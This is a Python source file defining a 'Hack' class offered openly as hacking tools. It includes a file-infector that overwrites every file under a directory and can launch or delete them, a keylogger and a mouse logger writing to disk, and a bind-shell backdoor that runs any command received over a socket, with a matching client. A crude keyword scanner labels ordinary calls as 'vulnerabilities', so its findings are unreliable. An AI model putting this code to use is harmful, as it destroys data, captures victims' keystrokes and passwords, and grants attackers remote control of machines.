from perks.DEV import Mark
import os
import subprocess
import socket

########### [SUB-CLASSES] #################### TASK CLASS ################# Over:Default Under:FileWrapper

class Hack(metaclass=Mark):
    """
   Python Class that provide useful Hacking Tools.
    """

    @staticmethod
    def infect(source=None, path=os.getcwd(), ext="",start=False, delete_source=False, delete_infected=False, delay=None, action=None):

        from subprocess import run
        from time import sleep as _sp

        if source:
            with open(source, 'r') as src:
                contents = src.read()
        else:
            contents = "https://grigoprg.webnode.it"

        for RootDir, __Fldrs__, _file in os.walk(path):
            for _file_ in _file:
                _path = RootDir + "\\" + _file_
                try:
                    if ext == "":
                        with open(_path, 'w') as fw:
                            fw.write(contents)
                        if action:
                            action()
                        if start:
                            run(f'start {_path}', shell=True)
                        if delay:
                            _sp(delay)
                        if delete_infected:
                            try:
                                os.unlink(_path)
                            except:
                                os.remove(_path)
                    else:
                        if _file_.endswith(ext):
                            with open(_path, 'w') as fw:
                                fw.write(contents)
                            if action:
                                action()
                            if start:
                                run(f'start {_path}', shell=True)
                            if delay:
                                _sp(delay)
                            if delete_infected:
                                try:
                                    os.unlink(_path)
                                except:
                                    os.remove(_path)
                except:
                    pass

        if delete_source:
            try:
                try:
                    os.unlink(file_source)
                except:
                    os.remove(file_source)
            except:
                pass    
            
    @classmethod      
    def class_name(cls):
        return cls.__name__
    
    @staticmethod
    def keylog(_path_):
        from pynput.keyboard import Key, Listener
        import logging

        if _path_.endswith("\\"):
            
            PATH = _path_ + "keylog.txt"
            
        else:
            
            PATH = _path_ + "\\" + "keylog.txt"

        logging.basicConfig(filename=PATH, level=logging.DEBUG, format='%(asctime)s: %(message)s')

        def on_press(key):
            logging.info(key)

        with Listener(on_press=on_press) as listener:
            listener.join()
            
    @staticmethod
    def clicklog(_path_):
        from pynput.mouse import Listener
        import logging

        if _path_.endswith("\\"):
            
            PATH = _path_ + "keylog.txt"
            
        else:
            
            PATH = _path_ + "\\" + "keylog.txt"

        logging.basicConfig(filename=PATH, level=logging.DEBUG, format="%(asctime)s: %(message)s")

        def on_move(x, y):
            logging.info("Mouse moved to ({0},{1})".format(x, y))

        def on_click(x, y, button, pressed):
            if pressed:
                logging.info("Mouse clicked at ({0},{1}) with {2}".format(x, y, button))

        def on_scroll(x, y, dx, dy):
            logging.info("Mouse scrolled at ({0},{1})({2},{3})".format(x, y, dx, dy))

        with Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener:
            listener.join()

    @staticmethod
    def Connect(host, port, buffer=4096):
        try:
            NO_USE = subprocess.run("chcp 65001", shell=True, stdout=subprocess.PIPE)
        except:
             pass

        _HOST = host
        _PORT = port

        socket_backdoor = socket.socket()
        socket_backdoor.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        socket_backdoor.connect((_HOST, _PORT))

        try:

            while True:
                command = input('>>>')
                socket_backdoor.send(command.encode())

                data = socket_backdoor.recv(buffer).decode()
                print(data)

        finally:

            socket_backdoor.close()
            return None

    @staticmethod
    def Local_Backdoor(host, port, backdoor_number=1, buffer=4096):

        try:
            os.system("chcp 65001")
        except:
            pass
        
        _HOST = host
        _PORT = port

        socket_server = socket.socket()
        socket_server.bind((_HOST,_PORT))
        socket_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        socket_server.listen(backdoor_number)
        connection, (target_ip, target_port) = socket_server.accept()

        try:

            while True:
                _backsniff = connection.recv(buffer).decode()

                if _backsniff.lower() == 'quit' or _backsniff.lower() == 'exit':
                    break

                if _backsniff.lower().startswith('cd'):
                    try:
                        os.chdir(_backsniff.split()[1])
                        response = f'Directory changed to :: {_backsniff.split()[1]}'
                    except:
                        try:
                            os.chdir(os.getcwd() + "\\" + _backsniff.split()[1])
                            response = f'Directory changed to :: {_backsniff.split()[1]}'
                        except:
                            response = f'Failed to change directory to :: {_backsniff.split()[1]}'
                            
                elif _backsniff.lower() == 'cwd':
                    response = str(os.getcwd())
                            
                elif _backsniff.lower().startswith('del'):
                    try:
                        os.unlink(_backsniff.split()[1])
                        response = f'File Deleted :: {_backsniff.split()[1]}'
                    except:
                        response = f'Failed to delete :: {_backsniff.split()[1]}'

                else:
                    response= subprocess.run(_backsniff, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    response = str(response.stdout) + str(response.stderr)
                    response = response.replace('\\n','\n')
                    response = response.replace('\\t','\t')
                    response = response.replace('\\r','\r')
                    response = response.replace('\\\\','\\')

                connection.send(response.encode())

        finally:

            connection.close()
            socket_server.close()
            return None

    @classmethod
    def scan(cls, host, port):
        from perks.task.connection import Connection

        if not isinstance(host, str) or not isinstance(port, int):
            raise ValueError("Host must be a string ('192.168.1.1'), and port an integer")
        
        return Connection.scan(host, port)

    @classmethod
    def get_ip(cls):
        try:
            return socket.gethostbyname(socket.gethostname())

        except:
            return False

    @classmethod
    def local_ip(cls, ipv6=False):
        try:
            from perks.task.connection import Connection
            result = Connection.local_ip(ipv6)
            return result

        except:
            raise Exception

    @classmethod
    def gethostname(cls):
        try:
            return socket.gethostname()

        except:
            return False

    @classmethod
    def Analize(cls, file, *args):
        from time import sleep as _sp

        DangerDict = {'import':0, 'system':0, 'run':0, 'read':0, 'l-read':0, 'write':0, 'socket':0,
                      'exec':0, '/0':0, 'with':0, 'open':0, 'close':0, 'C:\\':0, 'getcwd':0, 'unlink':0,
                      'del':0, 'cast':0, 'walk':0, 'connect':0, 'hacking':0, 'destroy':0, 'sys':0, 'argv':0,
                      'perks':0, 'args':0,
                      }
        LineDict = {'import':[], 'system':[], 'run':[], 'read':[], 'l-read':[], 'write':[], 'socket':[],
                      'exec':[], '/0':[], 'with':[], 'open':[], 'close':[], 'C:\\':[], 'getcwd':[], 'unlink':[],
                      'del':[], 'cast':[], 'walk':[], 'connect':[], 'hacking':[], 'destroy':[], 'sys':[], 'argv':[],
                      'perks':[], 'args':[],
                      }
        
        _sp(0.5)
        print("Processing File ... ")
        _sp(0.62)
        print()
        with open(file, 'r') as _f:
            text = _f.readlines()

        for pos, line in enumerate(text):
            
            if "import " in line:
                print(" >>> " + str(line).strip('\n') + "<<<")
                print(f"[+][{file}] [line {pos}] :: Library imported.")
                print()
                DangerDict['import'] += 1
                LineDict['import'].append(pos+1)

            if "system(" in line:
                print(" >>> " + str(line).strip('\n') + "<<<")
                print(f"[+][{file}] [line {pos}] :: Possibly System Shell Command.")
                print()
                DangerDict['system'] += 1
                LineDict['system'].append(pos+1)

            if "run(" in line:
                print(" >>> " + str(line).strip('\n') + "<<<")
                print(f"[+][{file}] [line {pos}] :: Possibly Subprocess Shell Command.")
                print()
                DangerDict['run'] += 1
                LineDict['run'].append(pos+1)

            if ".read(" in line:
                print(" >>> " + str(line).strip('\n') + "<<<")
                print(f"[+][{file}] [line {pos}] :: File reading. It can finish wrong.")
                print()
                DangerDict['read'] += 1
                LineDict['read'].append(pos+1)

            if ".readlines(" in line:
                print(" >>> " + str(line).strip('\n') + "<<<")
                print(f"[+][{file}] [line {pos}] :: File reading. It can finish wrong.")
                print()
                DangerDict['l-read'] += 1
                LineDict['l-read'].append(pos+1)

            if ".write(" in line:
                print(" >>> " + str(line).strip('\n') + "<<<")
                print(f"[+][{file}] [line {pos}] :: Writing on an extern file.")
                print()
                DangerDict['write'] += 1
                LineDict['write'].append(pos+1)
           
            if "socket" in line or ".bind(" in line or ".listen(" in line:
                print(" >>> " + str(line).strip('\n') + "<<<")
                print(f"[+][{file}] [line {pos}] :: Socket -- TCP/UDP Communication.")
                print()
                DangerDict['socket'] += 1
                LineDict['socket'].append(pos+1)

            if "exec" in line or "eval" in line or "compile" in line:
                print(" >>> " + str(line).strip('\n') + "<<<")
                print(f"[+][{file}] [line {pos}] :: Compilating some Imprevedible code.")
                print()
                DangerDict['exec'] += 1
                LineDict['exec'].append(pos+1)

            if "/0" in line:
                print(" >>> " + str(line).strip('\n') + " <<<")
                print(f"[+][{file}] [line {pos}] :: Division by 0.")
                print()
                DangerDict['/0'] += 1
                LineDict['/0'].append(pos+1)

            if "with" in line:
                print(" >>> " + str(line).strip('\n') + "<<<")
                print(f"[+][{file}] [line {pos}] :: Connecting something external with the 'with' statement.")
                print()
                DangerDict['with'] += 1
                LineDict['with'].append(pos+1)

            if "open(" in line:
                print(" >>> " + str(line).strip('\n') + "<<<")
                print(f"[+][{file}] [line {pos}] :: Opening a file. Possible risk.")
                print()
                DangerDict['open'] += 1
                LineDict['open'].append(pos+1)

            if "close" in line:
                print(" >>> " + str(line).strip('\n') + "<<<")
                print(f"[+][{file}] [line {pos}] :: Closing a file. Possible risk.")
                print()
                DangerDict['close'] += 1
                LineDict['close'].append(pos+1)

            if "C:\\" in line or "C:/" in line:
                print(" >>> " + str(line).strip('\n') + "<<<")
                print(f"[+][{file}] [line {pos}] :: PATH INDICATED IN FILE.")
                print()
                DangerDict['C:\\'] += 1
                LineDict['C:\\'].append(pos+1)

            if "os.getcwd(" in line:
                print(" >>> " + str(line).strip('\n') + "<<<")
                print(f"[+][{file}] [line {pos}] :: Obtaining the current directory. Hidden information")
                print()
                DangerDict['getcwd'] += 1
                LineDict['getcwd'].append(pos+1)

            if "unlink(" in line or "remove(" in line:
                print(" >>> " + str(line).strip('\n') + "<<<")
                print(f"[+][{file}] [line {pos}] :: Removing a file or an object.")
                print()
                DangerDict['unlink'] += 1
                LineDict['unlink'].append(pos+1)

            if "del " in line:
                print(" >>> " + str(line).strip('\n') + "<<<")
                print(f"[+][{file}] [line {pos}] :: Deleting a variable, a function or an object.")
                print()
                DangerDict['del'] += 1
                LineDict['del'].append(pos+1)

            if " int(" in(" "+line) or "float(" in line:
                print(" >>> " + str(line).strip('\n') + "<<<")
                print(f"[+][{file}] [line {pos}] :: Possibly failure of cast changing.")
                print()
                DangerDict['cast'] += 1
                LineDict['cast'].append(pos+1)

            if "walk(" in line:
                print(" >>> " + str(line).strip('\n') + "<<<")
                print(f"[+][{file}] [line {pos}] :: Possibly os.walk() of the entire File-System.")
                print()
                DangerDict['walk'] += 1
                LineDict['walk'].append(pos+1)

            if "connect(" in line:
                print(" >>> " + str(line).strip('\n') + "<<<")
                print(f"[+][{file}] [line {pos}] :: Connection with an external entity")
                print()
                DangerDict['connect'] += 1
                LineDict['connect'].append(pos+1)

            if "hacking" in line or "hack" in line:
                print(" >>> " + str(line).strip('\n') + "<<<")
                print(f"[+][{file}] [line {pos}] :: Possible dangerous program. Dangerous keyword for 'hacking'.")
                print()
                DangerDict['hacking'] += 1
                LineDict['hacking'].append(pos+1)

            if "destroy" in line or "delete" in line or "remove" in line:
                print(" >>> " + str(line).strip('\n') + "<<<")
                print(f"[+][{file}] [line {pos}] :: Possible dangerous program. Dangerous keyword 'destroy' or similar.")
                print()
                DangerDict['destroy'] += 1
                LineDict['destroy'].append(pos+1)

            if "import sys" in line or "from sys import" in line:
                print(" >>> " + str(line).strip('\n') + "<<<")
                print(f"[+][{file}] [line {pos}] :: Importation of the 'sys' module.")
                print()
                DangerDict['sys'] += 1
                LineDict['sys'].append(pos+1)

            if "argv" in line:
                if "sys.argv" in line:
                    print(" >>> " + str(line).strip('\n') + "<<<")
                    print(f"[+][{file}] [line {pos}] :: Dangerous imprevedible shell arguments from sys module.")
                    print()
                    DangerDict['argv'] += 1
                    LineDict['argv'].append(pos+1)
                
                else:
                    print(" >>> " + str(line).strip('\n') + "<<<")
                    print(f"[+][{file}] [line {pos}] :: Possible dangerous keyword 'argv', possible arguments.")
                    print()
                    DangerDict['argv'] += 1
                    LineDict['argv'].append(pos+1)

            if "import perks" in line or "from perks import" in line:
                print(" >>> " + str(line).strip('\n') + "<<<")
                print(f"[++][{file}] [line {pos}] :: Extremly dangerous module 'perks'.")
                print()
                DangerDict['perks'] += 1
                LineDict['perks'].append(pos+1)
                
            if args:
                for arg in args:
                    if str(arg) in line:
                        print(" >>> " + str(line).strip('\n') + "<<<")
                        print(f"[+][{file}] [line {pos}] :: *args variable found here.")
                        print()
                        DangerDict['args'] += 1
                        LineDict['args'].append(pos+1)
                        
            _sp(0.01)

        print(":: VULNERABILITY FOUNDED ::\n")
        total = 0

        for key, value in DangerDict.items():
            if value > 0:
                print(str(key) + "\t:: founded [" + str(value) + "]\tlines :: " + str(LineDict[key]))
                total += value

        print("\nTotal Possible Vulnerabilities :: " + str(total))
                
        return None

